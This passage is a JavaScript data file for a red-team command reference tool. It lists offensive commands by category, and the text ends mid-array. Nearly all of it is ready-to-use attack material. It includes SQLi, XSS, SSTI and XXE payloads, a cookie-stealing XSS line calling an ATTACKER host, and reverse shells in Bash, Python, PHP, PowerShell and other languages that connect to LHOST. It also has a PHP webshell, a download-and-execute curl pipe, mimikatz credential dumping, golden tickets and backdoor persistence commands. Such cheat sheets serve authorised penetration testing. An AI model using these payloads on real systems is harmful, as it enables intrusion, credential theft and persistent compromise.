/* ==================== COMMAND REFERENCE CENTER PRO 📋⚡ ==================== */
/* Comprehensive Quick Reference for Red Team Operations - Enhanced with AI */

window.CommandRef = {
    // === EXPANDED COMMAND DATABASE ===
    categories: [
        {
            id: 'recon',
            name: 'Reconnaissance',
            nameAr: 'الاستطلاع',
            icon: 'fa-search',
            color: '#3498db',
            commands: [
                // Nmap
                { name: 'Nmap Full Scan', cmd: 'nmap -sC -sV -p- -oA full_scan TARGET', tags: ['nmap', 'ports', 'full'], desc: 'Complete port scan with scripts and version detection' },
                { name: 'Nmap Quick Scan', cmd: 'nmap -sV -sC -T4 TARGET', tags: ['nmap', 'quick'], desc: 'Fast scan top 1000 ports' },
                { name: 'Nmap UDP Scan', cmd: 'nmap -sU --top-ports=100 TARGET', tags: ['nmap', 'udp'], desc: 'Scan common UDP ports' },
                { name: 'Nmap Vuln Scripts', cmd: 'nmap --script vuln TARGET', tags: ['nmap', 'vuln'], desc: 'Run vulnerability scripts' },
                { name: 'Nmap Stealth Scan', cmd: 'nmap -sS -Pn -n -T2 TARGET', tags: ['nmap', 'stealth'], desc: 'Low and slow scan' },
                { name: 'Nmap OS Detection', cmd: 'nmap -O TARGET', tags: ['nmap', 'os'], desc: 'Detect operating system' },
                { name: 'Nmap SMB Scripts', cmd: 'nmap --script smb-enum-shares,smb-enum-users -p445 TARGET', tags: ['nmap', 'smb'], desc: 'Enumerate SMB shares/users' },
                { name: 'Nmap HTTP Enum', cmd: 'nmap --script http-enum -p80,443 TARGET', tags: ['nmap', 'http'], desc: 'HTTP enumeration' },
                // Subdomain
                { name: 'Subfinder', cmd: 'subfinder -d TARGET -o subs.txt', tags: ['subdomain', 'passive'], desc: 'Passive subdomain enumeration' },
                { name: 'Amass Enum', cmd: 'amass enum -d TARGET -o amass.txt', tags: ['subdomain', 'amass'], desc: 'Comprehensive subdomain discovery' },
                { name: 'Assetfinder', cmd: 'assetfinder --subs-only TARGET', tags: ['subdomain', 'asset'], desc: 'Fast subdomain finder' },
                { name: 'DNSRecon', cmd: 'dnsrecon -d TARGET -t std', tags: ['dns', 'enum'], desc: 'DNS enumeration' },
                // Dir/File
                { name: 'Gobuster Dir', cmd: 'gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -x php,txt,html', tags: ['dirbust', 'gobuster'], desc: 'Directory brute force' },
                { name: 'Feroxbuster', cmd: 'feroxbuster -u http://TARGET -w wordlist.txt -x php,txt', tags: ['dirbust', 'ferox'], desc: 'Fast recursive dir scan' },
                { name: 'FFUF Dir', cmd: 'ffuf -u http://TARGET/FUZZ -w wordlist.txt', tags: ['ffuf', 'dir'], desc: 'Fuzz directories' },
                { name: 'FFUF Vhost', cmd: 'ffuf -u http://TARGET -H "Host: FUZZ.TARGET" -w vhosts.txt', tags: ['ffuf', 'vhost'], desc: 'Virtual host discovery' },
                // Network
                { name: 'Nikto Scan', cmd: 'nikto -h http://TARGET', tags: ['nikto', 'web'], desc: 'Web server scanner' },
                { name: 'WhatWeb', cmd: 'whatweb http://TARGET', tags: ['whatweb', 'fingerprint'], desc: 'Web technology fingerprint' },
                { name: 'Wappalyzer CLI', cmd: 'wappalyzer http://TARGET', tags: ['wappalyzer', 'tech'], desc: 'Technology detection' },
                // SMB/Windows
                { name: 'Enum4linux', cmd: 'enum4linux -a TARGET', tags: ['smb', 'enum'], desc: 'SMB/NetBIOS enumeration' },
                { name: 'SMBClient List', cmd: 'smbclient -L //TARGET -N', tags: ['smb', 'shares'], desc: 'List SMB shares' },
                { name: 'SMBMap', cmd: 'smbmap -H TARGET', tags: ['smb', 'map'], desc: 'SMB share permissions' },
                { name: 'CrackMapExec SMB', cmd: 'crackmapexec smb TARGET', tags: ['cme', 'smb'], desc: 'CME SMB enumeration' },
                { name: 'RPC Null Session', cmd: 'rpcclient -U "" -N TARGET', tags: ['rpc', 'null'], desc: 'RPC null session' },
                // DNS
                { name: 'DNS Zone Transfer', cmd: 'dig axfr @NAMESERVER DOMAIN', tags: ['dns', 'zone'], desc: 'Attempt zone transfer' },
                { name: 'DNS Reverse', cmd: 'dig -x IP_ADDRESS', tags: ['dns', 'reverse'], desc: 'Reverse DNS lookup' },
                { name: 'Host Lookup', cmd: 'host -t any TARGET', tags: ['dns', 'host'], desc: 'All DNS records' }
            ]
        },
        {
            id: 'web',
            name: 'Web Attacks',
            nameAr: 'هجمات الويب',
            icon: 'fa-globe',
            color: '#e74c3c',
            commands: [
                // SQL Injection
                { name: 'SQLi Auth Bypass', cmd: "' OR '1'='1", tags: ['sqli', 'auth'], desc: 'Basic authentication bypass' },
                { name: 'SQLi OR 1=1', cmd: "' OR 1=1--", tags: ['sqli', 'basic'], desc: 'Classic SQLi test' },
                { name: 'SQLi UNION Columns', cmd: "' UNION SELECT NULL,NULL,NULL-- -", tags: ['sqli', 'union'], desc: 'Find column count' },
                { name: 'SQLi Version MySQL', cmd: "' UNION SELECT @@version,NULL,NULL-- -", tags: ['sqli', 'version'], desc: 'MySQL version' },
                { name: 'SQLi Tables Enum', cmd: "' UNION SELECT table_name,NULL FROM information_schema.tables-- -", tags: ['sqli', 'enum'], desc: 'Enumerate tables' },
                { name: 'SQLi Columns Enum', cmd: "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -", tags: ['sqli', 'columns'], desc: 'Get columns' },
                { name: 'SQLi File Read', cmd: "' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL-- -", tags: ['sqli', 'file'], desc: 'Read files (MySQL)' },
                { name: 'SQLMap Basic', cmd: 'sqlmap -u "http://TARGET?id=1" --dbs', tags: ['sqlmap', 'auto'], desc: 'Automated SQLi' },
                { name: 'SQLMap Dump', cmd: 'sqlmap -u "http://TARGET?id=1" -D db -T users --dump', tags: ['sqlmap', 'dump'], desc: 'Dump table' },
                // XSS
                { name: 'XSS Alert', cmd: '<script>alert(1)</script>', tags: ['xss', 'basic'], desc: 'Basic XSS test' },
                { name: 'XSS IMG Error', cmd: '<img src=x onerror=alert(1)>', tags: ['xss', 'img'], desc: 'Image error XSS' },
                { name: 'XSS SVG', cmd: '<svg onload=alert(1)>', tags: ['xss', 'svg'], desc: 'SVG onload XSS' },
                { name: 'XSS Body Onload', cmd: '<body onload=alert(1)>', tags: ['xss', 'body'], desc: 'Body event XSS' },
                { name: 'XSS Cookie Steal', cmd: '<script>new Image().src="http://ATTACKER/?c="+document.cookie</script>', tags: ['xss', 'cookie'], desc: 'Steal cookies' },
                { name: 'XSS Filter Bypass', cmd: '<ScRiPt>alert(1)</ScRiPt>', tags: ['xss', 'bypass'], desc: 'Case bypass' },
                { name: 'XSS Without Brackets', cmd: '<img src=x onerror=alert`1`>', tags: ['xss', 'bypass'], desc: 'Template literal' },
                // LFI/RFI
                { name: 'LFI Basic', cmd: '../../../../../../etc/passwd', tags: ['lfi', 'traversal'], desc: 'Path traversal' },
                { name: 'LFI Null Byte', cmd: '../../../../../../etc/passwd%00', tags: ['lfi', 'null'], desc: 'Null byte bypass' },
                { name: 'LFI Double Encode', cmd: '..%252f..%252f..%252fetc/passwd', tags: ['lfi', 'encode'], desc: 'Double URL encode' },
                { name: 'LFI PHP Filter', cmd: 'php://filter/convert.base64-encode/resource=index.php', tags: ['lfi', 'php'], desc: 'Read PHP source' },
                { name: 'LFI PHP Input', cmd: 'php://input', tags: ['lfi', 'rce'], desc: 'PHP input RCE' },
                { name: 'LFI Log Poison', cmd: '/var/log/apache2/access.log', tags: ['lfi', 'poison'], desc: 'Log poisoning' },
                { name: 'RFI Include', cmd: 'http://ATTACKER/shell.txt', tags: ['rfi', 'include'], desc: 'Remote include' },
                // SSTI
                { name: 'SSTI Test', cmd: '{{7*7}}', tags: ['ssti', 'test'], desc: 'Template test (49)' },
                { name: 'SSTI Jinja2 RCE', cmd: "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", tags: ['ssti', 'jinja'], desc: 'Jinja2 RCE' },
                { name: 'SSTI Twig', cmd: '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}', tags: ['ssti', 'twig'], desc: 'Twig RCE' },
                // XXE
                { name: 'XXE File Read', cmd: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', tags: ['xxe', 'file'], desc: 'Read local files' },
                { name: 'XXE SSRF', cmd: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal:8080/">]><foo>&xxe;</foo>', tags: ['xxe', 'ssrf'], desc: 'XXE to SSRF' },
                // SSRF
                { name: 'SSRF Localhost', cmd: 'http://127.0.0.1:8080', tags: ['ssrf', 'local'], desc: 'Access localhost' },
                { name: 'SSRF IPv6', cmd: 'http://[::1]:8080/', tags: ['ssrf', 'ipv6'], desc: 'IPv6 localhost' },
                { name: 'SSRF AWS Meta', cmd: 'http://169.254.169.254/latest/meta-data/', tags: ['ssrf', 'aws'], desc: 'AWS metadata' },
                // Command Injection
                { name: 'CMDi Semicolon', cmd: '; id', tags: ['cmdi', 'basic'], desc: 'Command separator' },
                { name: 'CMDi Pipe', cmd: '| id', tags: ['cmdi', 'pipe'], desc: 'Pipe injection' },
                { name: 'CMDi Backtick', cmd: '`id`', tags: ['cmdi', 'backtick'], desc: 'Backtick exec' },
                { name: 'CMDi Dollar', cmd: '$(id)', tags: ['cmdi', 'dollar'], desc: 'Dollar substitution' },
                { name: 'CMDi Newline', cmd: '%0aid', tags: ['cmdi', 'newline'], desc: 'Newline injection' }
            ]
        },
        {
            id: 'shells',
            name: 'Reverse Shells',
            nameAr: 'الشل العكسي',
            icon: 'fa-terminal',
            color: '#2ecc71',
            commands: [
                // Bash
                { name: 'Bash TCP', cmd: 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1', tags: ['bash', 'tcp'], desc: 'Bash reverse shell' },
                { name: 'Bash UDP', cmd: 'bash -i >& /dev/udp/LHOST/LPORT 0>&1', tags: ['bash', 'udp'], desc: 'Bash UDP shell' },
                // Netcat
                { name: 'Netcat -e', cmd: 'nc -e /bin/sh LHOST LPORT', tags: ['nc', 'e'], desc: 'NC with -e flag' },
                { name: 'Netcat mkfifo', cmd: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f', tags: ['nc', 'fifo'], desc: 'NC without -e' },
                { name: 'Netcat BusyBox', cmd: 'rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f', tags: ['nc', 'busybox'], desc: 'BusyBox compatible' },
                // Python
                { name: 'Python3 RevShell', cmd: 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'', tags: ['python', 'reverse'], desc: 'Python3 shell' },
                { name: 'Python2 RevShell', cmd: 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'', tags: ['python', 'reverse'], desc: 'Python2 shell' },
                // PHP
                { name: 'PHP RevShell', cmd: 'php -r \'$sock=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");\'', tags: ['php', 'reverse'], desc: 'PHP reverse shell' },
                { name: 'PHP Exec', cmd: '<?php system($_GET["cmd"]); ?>', tags: ['php', 'webshell'], desc: 'Simple PHP webshell' },
                // Ruby
                { name: 'Ruby RevShell', cmd: 'ruby -rsocket -e\'s=TCPSocket.open("LHOST",LPORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",s,s,s)\'', tags: ['ruby', 'reverse'], desc: 'Ruby shell' },
                // Perl
                { name: 'Perl RevShell', cmd: 'perl -e \'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'', tags: ['perl', 'reverse'], desc: 'Perl shell' },
                // PowerShell
                { name: 'PowerShell RevShell', cmd: 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'LHOST\',LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"', tags: ['powershell', 'windows'], desc: 'PS reverse shell' },
                // Java
                { name: 'Java RevShell', cmd: 'r = Runtime.getRuntime();p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/LHOST/LPORT;cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[]);p.waitFor()', tags: ['java', 'reverse'], desc: 'Java runtime shell' },
                // Socat
                { name: 'Socat RevShell', cmd: 'socat TCP:LHOST:LPORT EXEC:/bin/sh', tags: ['socat', 'reverse'], desc: 'Socat shell' },
                { name: 'Socat TTY', cmd: 'socat TCP:LHOST:LPORT EXEC:\'/bin/bash\',pty,stderr,setsid,sigint,sane', tags: ['socat', 'tty'], desc: 'Full TTY socat' },
                // Listeners
                { name: 'NC Listener', cmd: 'nc -lvnp LPORT', tags: ['listener', 'nc'], desc: 'Netcat listener' },
                { name: 'Socat Listener', cmd: 'socat file:`tty`,raw,echo=0 tcp-listen:LPORT', tags: ['listener', 'socat'], desc: 'Socat listener' },
                { name: 'Pwncat Listener', cmd: 'pwncat-cs -lp LPORT', tags: ['listener', 'pwncat'], desc: 'Pwncat listener' },
                // Shell Upgrade
                { name: 'Python PTY', cmd: 'python3 -c \'import pty;pty.spawn("/bin/bash")\'', tags: ['upgrade', 'pty'], desc: 'Spawn PTY shell' },
                { name: 'Script PTY', cmd: 'script -qc /bin/bash /dev/null', tags: ['upgrade', 'script'], desc: 'Script PTY' },
                { name: 'STTY Fix', cmd: 'stty raw -echo; fg', tags: ['upgrade', 'stty'], desc: 'Fix terminal' },
                { name: 'Export Term', cmd: 'export TERM=xterm-256color', tags: ['upgrade', 'term'], desc: 'Set terminal type' }
            ]
        },
        {
            id: 'privesc',
            name: 'Privilege Escalation',
            nameAr: 'رفع الصلاحيات',
            icon: 'fa-arrow-up',
            color: '#9b59b6',
            commands: [
                // Linux Enum
                { name: 'Linux Kernel', cmd: 'uname -a', tags: ['linux', 'enum'], desc: 'Kernel version' },
                { name: 'Linux Distro', cmd: 'cat /etc/*release', tags: ['linux', 'distro'], desc: 'Distribution info' },
                { name: 'SUID Find', cmd: 'find / -perm -4000 -type f 2>/dev/null', tags: ['linux', 'suid'], desc: 'Find SUID binaries' },
                { name: 'SGID Find', cmd: 'find / -perm -2000 -type f 2>/dev/null', tags: ['linux', 'sgid'], desc: 'Find SGID binaries' },
                { name: 'Capabilities', cmd: 'getcap -r / 2>/dev/null', tags: ['linux', 'cap'], desc: 'Find capabilities' },
                { name: 'Sudo -l', cmd: 'sudo -l', tags: ['linux', 'sudo'], desc: 'Sudo permissions' },
                { name: 'Writable Files', cmd: 'find / -writable -type f 2>/dev/null | grep -v proc', tags: ['linux', 'writable'], desc: 'World writable' },
                { name: 'Writable Dirs', cmd: 'find / -writable -type d 2>/dev/null', tags: ['linux', 'dirs'], desc: 'Writable directories' },
                { name: 'Cron Jobs', cmd: 'cat /etc/crontab; ls -la /etc/cron.*', tags: ['linux', 'cron'], desc: 'Scheduled tasks' },
                { name: 'Running Processes', cmd: 'ps aux | grep root', tags: ['linux', 'process'], desc: 'Root processes' },
                { name: 'Network Connections', cmd: 'netstat -tulpn 2>/dev/null || ss -tulpn', tags: ['linux', 'network'], desc: 'Listening ports' },
                { name: 'Users List', cmd: 'cat /etc/passwd | grep -v nologin', tags: ['linux', 'users'], desc: 'System users' },
                { name: 'SSH Keys', cmd: 'find / -name id_rsa 2>/dev/null', tags: ['linux', 'ssh'], desc: 'Find SSH keys' },
                { name: 'History Files', cmd: 'cat ~/.bash_history ~/.zsh_history 2>/dev/null', tags: ['linux', 'history'], desc: 'Command history' },
                { name: 'LinPEAS', cmd: 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh', tags: ['linpeas', 'auto'], desc: 'Automated enum' },
                { name: 'LinEnum', cmd: './LinEnum.sh -t', tags: ['linenum', 'auto'], desc: 'Linux enumeration' },
                // Windows Enum
                { name: 'Windows Whoami', cmd: 'whoami /all', tags: ['windows', 'whoami'], desc: 'Current user info' },
                { name: 'Windows Privs', cmd: 'whoami /priv', tags: ['windows', 'priv'], desc: 'Current privileges' },
                { name: 'Windows Groups', cmd: 'net localgroup administrators', tags: ['windows', 'groups'], desc: 'Admin group' },
                { name: 'Windows Systeminfo', cmd: 'systeminfo', tags: ['windows', 'system'], desc: 'System information' },
                { name: 'Windows Services', cmd: 'wmic service get name,pathname,startmode | findstr /i /v "C:\\Windows"', tags: ['windows', 'services'], desc: 'Third party services' },
                { name: 'Unquoted Service', cmd: 'wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows"', tags: ['windows', 'unquoted'], desc: 'Unquoted service paths' },
                { name: 'AlwaysInstallElevated', cmd: 'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated', tags: ['windows', 'msi'], desc: 'Check MSI privesc' },
                { name: 'Stored Credentials', cmd: 'cmdkey /list', tags: ['windows', 'creds'], desc: 'Saved credentials' },
                { name: 'SAM Backup', cmd: 'reg save HKLM\\SAM sam.save & reg save HKLM\\SYSTEM system.save', tags: ['windows', 'sam'], desc: 'Backup SAM/SYSTEM' },
                { name: 'WinPEAS', cmd: 'winPEASx64.exe', tags: ['winpeas', 'auto'], desc: 'Automated enum' },
                { name: 'PowerUp', cmd: 'powershell -ep bypass -c "Import-Module .\\PowerUp.ps1; Invoke-AllChecks"', tags: ['powerup', 'auto'], desc: 'PowerUp checks' }
            ]
        },
        {
            id: 'ad',
            name: 'Active Directory',
            nameAr: 'الدليل النشط',
            icon: 'fa-sitemap',
            color: '#f39c12',
            commands: [
                // Enumeration
                { name: 'BloodHound Collect', cmd: 'SharpHound.exe -c All -d DOMAIN --zipfilename bh.zip', tags: ['bloodhound', 'collect'], desc: 'Collect AD data' },
                { name: 'BloodHound Python', cmd: 'bloodhound-python -u USER -p PASS -d DOMAIN -dc DC_IP -c All', tags: ['bloodhound', 'linux'], desc: 'Linux collector' },
                { name: 'PowerView Domain', cmd: 'Get-Domain', tags: ['powerview', 'domain'], desc: 'Domain info' },
                { name: 'PowerView Users', cmd: 'Get-DomainUser | select samaccountname', tags: ['powerview', 'users'], desc: 'List domain users' },
                { name: 'PowerView Computers', cmd: 'Get-DomainComputer | select name,operatingsystem', tags: ['powerview', 'computers'], desc: 'List computers' },
                { name: 'PowerView Groups', cmd: 'Get-DomainGroup | select name', tags: ['powerview', 'groups'], desc: 'List groups' },
                { name: 'PowerView AdminCount', cmd: 'Get-DomainUser -AdminCount | select samaccountname', tags: ['powerview', 'admin'], desc: 'Admin users' },
                { name: 'LDAP Null Bind', cmd: 'ldapsearch -x -H ldap://DC_IP -b "dc=domain,dc=local"', tags: ['ldap', 'null'], desc: 'Anonymous LDAP' },
                // Kerberos Attacks
                { name: 'Kerberoasting', cmd: 'GetUserSPNs.py DOMAIN/USER:PASS -dc-ip DC_IP -request -outputfile hashes.txt', tags: ['kerberos', 'roast'], desc: 'Get SPN hashes' },
                { name: 'AS-REP Roasting', cmd: 'GetNPUsers.py DOMAIN/ -dc-ip DC_IP -usersfile users.txt -no-pass -outputfile asrep.txt', tags: ['asrep', 'roast'], desc: 'Get AS-REP hashes' },
                { name: 'Rubeus Kerberoast', cmd: 'Rubeus.exe kerberoast /outfile:hashes.txt', tags: ['rubeus', 'roast'], desc: 'Windows kerberoasting' },
                { name: 'Rubeus AS-REP', cmd: 'Rubeus.exe asreproast /outfile:asrep.txt', tags: ['rubeus', 'asrep'], desc: 'Windows AS-REP' },
                // Pass Attacks
                { name: 'Pass-the-Hash', cmd: 'psexec.py -hashes :NTLM_HASH DOMAIN/ADMIN@TARGET', tags: ['pth', 'impacket'], desc: 'PTH with psexec' },
                { name: 'WMIexec PTH', cmd: 'wmiexec.py -hashes :NTLM_HASH DOMAIN/ADMIN@TARGET', tags: ['pth', 'wmi'], desc: 'PTH with WMI' },
                { name: 'Evil-WinRM PTH', cmd: 'evil-winrm -i TARGET -u USER -H NTLM_HASH', tags: ['pth', 'winrm'], desc: 'PTH with WinRM' },
                { name: 'Overpass-the-Hash', cmd: 'getTGT.py DOMAIN/USER -hashes :NTLM_HASH -dc-ip DC_IP', tags: ['opth', 'tgt'], desc: 'Get TGT from hash' },
                { name: 'Pass-the-Ticket', cmd: 'export KRB5CCNAME=ticket.ccache; psexec.py -k DOMAIN/ADMIN@TARGET', tags: ['ptt', 'ticket'], desc: 'Use Kerberos ticket' },
                // Credential Extraction
                { name: 'DCSync', cmd: 'secretsdump.py DOMAIN/USER:PASS@DC_IP -just-dc-ntlm', tags: ['dcsync', 'ntlm'], desc: 'Extract DC hashes' },
                { name: 'Mimikatz LogonPass', cmd: 'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit', tags: ['mimikatz', 'logon'], desc: 'Dump credentials' },
                { name: 'Mimikatz DCSync', cmd: 'mimikatz.exe "lsadump::dcsync /domain:DOMAIN /user:Administrator" exit', tags: ['mimikatz', 'dcsync'], desc: 'DCSync attack' },
                { name: 'Mimikatz SAM', cmd: 'mimikatz.exe "lsadump::sam /system:system.save /sam:sam.save" exit', tags: ['mimikatz', 'sam'], desc: 'Extract SAM hashes' },
                // Delegation
                { name: 'Find Delegation', cmd: 'Get-DomainComputer -TrustedToAuth | select name,msds-allowedtodelegateto', tags: ['delegation', 'find'], desc: 'Find delegation' },
                { name: 'S4U2Self', cmd: 'getST.py -spn SERVICE/TARGET -impersonate Administrator DOMAIN/USER -hashes :HASH', tags: ['delegation', 's4u'], desc: 'Constrained delegation' }
            ]
        },
        {
            id: 'transfer',
            name: 'File Transfer',
            nameAr: 'نقل الملفات',
            icon: 'fa-exchange-alt',
            color: '#1abc9c',
            commands: [
                // Linux Download
                { name: 'Wget', cmd: 'wget http://LHOST/file -O /tmp/file', tags: ['wget', 'download'], desc: 'Download with wget' },
                { name: 'Curl', cmd: 'curl http://LHOST/file -o /tmp/file', tags: ['curl', 'download'], desc: 'Download with curl' },
                { name: 'Curl Bash', cmd: 'curl http://LHOST/script.sh | bash', tags: ['curl', 'exec'], desc: 'Download and execute' },
                { name: 'Python Download', cmd: 'python3 -c "import urllib.request; urllib.request.urlretrieve(\'http://LHOST/file\', \'/tmp/file\')"', tags: ['python', 'download'], desc: 'Python download' },
                // Windows Download
                { name: 'PowerShell IWR', cmd: 'iwr -uri http://LHOST/file -OutFile file.exe', tags: ['powershell', 'download'], desc: 'PS web request' },
                { name: 'PowerShell Bits', cmd: 'Start-BitsTransfer -Source http://LHOST/file -Destination file.exe', tags: ['powershell', 'bits'], desc: 'BITS transfer' },
                { name: 'Certutil', cmd: 'certutil -urlcache -split -f http://LHOST/file file.exe', tags: ['certutil', 'windows'], desc: 'Certutil download' },
                { name: 'Bitsadmin', cmd: 'bitsadmin /transfer job /download /priority high http://LHOST/file C:\\file.exe', tags: ['bitsadmin', 'windows'], desc: 'Bitsadmin transfer' },
                // Servers
                { name: 'Python HTTP', cmd: 'python3 -m http.server 80', tags: ['python', 'server'], desc: 'HTTP server' },
                { name: 'PHP Server', cmd: 'php -S 0.0.0.0:80', tags: ['php', 'server'], desc: 'PHP server' },
                { name: 'Ruby Server', cmd: 'ruby -run -e httpd . -p 80', tags: ['ruby', 'server'], desc: 'Ruby server' },
                { name: 'SMB Server', cmd: 'impacket-smbserver share . -smb2support', tags: ['smb', 'impacket'], desc: 'SMB share server' },
                { name: 'SMB Server Auth', cmd: 'impacket-smbserver share . -smb2support -user USER -password PASS', tags: ['smb', 'auth'], desc: 'SMB with auth' },
                // Upload
                { name: 'SCP Upload', cmd: 'scp file.txt user@TARGET:/tmp/', tags: ['scp', 'upload'], desc: 'SCP file upload' },
                { name: 'SCP Download', cmd: 'scp user@TARGET:/tmp/file.txt .', tags: ['scp', 'download'], desc: 'SCP from target' },
                { name: 'NC Transfer', cmd: 'nc -lvnp 4444 > file.txt', tags: ['nc', 'receive'], desc: 'NC receive file' },
                { name: 'NC Send', cmd: 'nc TARGET 4444 < file.txt', tags: ['nc', 'send'], desc: 'NC send file' },
                // Base64
                { name: 'Base64 Encode', cmd: 'base64 file.bin > encoded.txt', tags: ['base64', 'encode'], desc: 'Encode file' },
                { name: 'Base64 Decode', cmd: 'base64 -d encoded.txt > file.bin', tags: ['base64', 'decode'], desc: 'Decode file' }
            ]
        },
        {
            id: 'persistence',
            name: 'Persistence',
            nameAr: 'التثبيت',
            icon: 'fa-anchor',
            color: '#8e44ad',
            commands: [
                // Linux
                { name: 'SSH Key Add', cmd: 'echo "PUBKEY" >> ~/.ssh/authorized_keys', tags: ['linux', 'ssh'], desc: 'Add SSH key' },
                { name: 'Cron Backdoor', cmd: '(crontab -l; echo "*/5 * * * * /tmp/shell.sh") | crontab -', tags: ['linux', 'cron'], desc: 'Cron persistence' },
                { name: 'Bashrc Backdoor', cmd: 'echo "bash -i >& /dev/tcp/LHOST/LPORT 0>&1 &" >> ~/.bashrc', tags: ['linux', 'bashrc'], desc: 'Profile backdoor' },
                { name: 'SUID Backdoor', cmd: 'cp /bin/bash /tmp/.backdoor; chmod +s /tmp/.backdoor', tags: ['linux', 'suid'], desc: 'SUID shell' },
                { name: 'Systemd Service', cmd: 'systemctl enable my-backdoor.service', tags: ['linux', 'systemd'], desc: 'Service persistence' },
                // Windows
                { name: 'Registry Run', cmd: 'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d "C:\\backdoor.exe"', tags: ['windows', 'registry'], desc: 'Run key persistence' },
                { name: 'Scheduled Task', cmd: 'schtasks /create /tn "Update" /tr "C:\\backdoor.exe" /sc onlogon', tags: ['windows', 'schtask'], desc: 'Task scheduler' },
                { name: 'WMI Event', cmd: 'wmic /NAMESPACE:"\\\\root\\subscription" PATH __EventFilter CREATE Name="filter", EventNamespace="root\\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'Win32_LocalTime\'"', tags: ['windows', 'wmi'], desc: 'WMI subscription' },
                { name: 'Golden Ticket', cmd: 'mimikatz.exe "kerberos::golden /user:Administrator /domain:DOMAIN /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /ptt" exit', tags: ['windows', 'golden'], desc: 'Golden ticket attack' },
                { name: 'Silver Ticket', cmd: 'mimikatz.exe "kerberos::golden /user:Administrator /domain:DOMAIN /sid:DOMAIN_SID /target:TARGET /service:SERVICE /rc4:SERVICE_HASH /ptt" exit', tags: ['windows', 'silver'], desc: 'Silver ticket attack' },
                { name: 'Skeleton Key', cmd: 'mimikatz.exe "privilege::debug" "misc::skeleton" exit', tags: ['windows', 'skeleton'], desc: 'Skeleton key injection' }
            ]
        },
        {
            id: 'lateral',
            name: 'Lateral Movement',
            nameAr: 'الحركة الجانبية',
            icon: 'fa-project-diagram',
            color: '#e67e22',
            commands: [
                // Windows Remote Exec
                { name: 'PSExec', cmd: 'psexec.py DOMAIN/USER:PASS@TARGET', tags: ['psexec', 'impacket'], desc: 'Remote command exec' },
                { name: 'WMIexec', cmd: 'wmiexec.py DOMAIN/USER:PASS@TARGET', tags: ['wmi', 'impacket'], desc: 'WMI exec' },
                { name: 'SMBexec', cmd: 'smbexec.py DOMAIN/USER:PASS@TARGET', tags: ['smb', 'impacket'], desc: 'SMB exec' },
                { name: 'ATExec', cmd: 'atexec.py DOMAIN/USER:PASS@TARGET "command"', tags: ['at', 'impacket'], desc: 'Task scheduler exec' },
                { name: 'Evil-WinRM', cmd: 'evil-winrm -i TARGET -u USER -p PASS', tags: ['winrm', 'evil'], desc: 'WinRM shell' },
                { name: 'CrackMapExec', cmd: 'crackmapexec smb TARGET -u USER -p PASS -x "command"', tags: ['cme', 'smb'], desc: 'CME command exec' },
                // SSH
                { name: 'SSH Dynamic', cmd: 'ssh -D 1080 user@TARGET', tags: ['ssh', 'socks'], desc: 'SOCKS proxy' },
                { name: 'SSH Local Forward', cmd: 'ssh -L LOCAL_PORT:INTERNAL:REMOTE_PORT user@TARGET', tags: ['ssh', 'local'], desc: 'Local port forward' },
                { name: 'SSH Remote Forward', cmd: 'ssh -R REMOTE_PORT:localhost:LOCAL_PORT user@TARGET', tags: ['ssh', 'remote'], desc: 'Remote port forward' },
                // Pivoting
                { name: 'Chisel Server', cmd: 'chisel server --reverse -p 8080', tags: ['chisel', 'server'], desc: 'Chisel server' },
                { name: 'Chisel Client', cmd: 'chisel client LHOST:8080 R:socks', tags: ['chisel', 'client'], desc: 'Chisel SOCKS proxy' },
                { name: 'Ligolo Server', cmd: 'ligolo-ng --selfcert', tags: ['ligolo', 'server'], desc: 'Ligolo proxy server' },
                { name: 'Socat Relay', cmd: 'socat TCP-LISTEN:8080,fork TCP:TARGET:80', tags: ['socat', 'relay'], desc: 'Port relay' },
